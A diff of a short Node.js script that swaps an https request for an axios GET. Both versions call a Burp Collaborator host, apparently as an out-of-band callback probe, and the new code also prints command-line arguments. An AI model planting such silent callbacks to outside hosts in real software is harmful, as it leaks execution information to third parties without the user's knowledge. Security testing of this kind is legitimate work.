@@ -1,22 +1,20 @@
-const https = require('https')
-const options = {
-  hostname: 'ct9xmxzn1rxdhr4bnz0dtcdz9qfh36.burpcollaborator.net',
-  port: 443,
-  path: 'fromgit/',
-  method: 'GET'
-}
-const req = https.request(options, res => {
-  console.log(`statusCode: ${res.statusCode}`)
+const axios = require('axios')
 
-  res.on('data', d => {
-    process.stdout.write(d)
+axios
+  .get('ct9xmxzn1rxdhr4bnz0dtcdz9qfh36.burpcollaborator.net/from_axois/')
+  .then(res => {
+    console.log(`statusCode: ${res.status}`)
+    console.log(res)
   })
-})
+  .catch(error => {
+    console.error(error)
+  })
 
 
-req.on('error', error => {
-  console.error(error)
-})
 
-req.end()
+
+// Get arguments from the command line
+const arg_list = process.argv.slice(2);
+console.log('myArgs: ', arg_list);
+
 
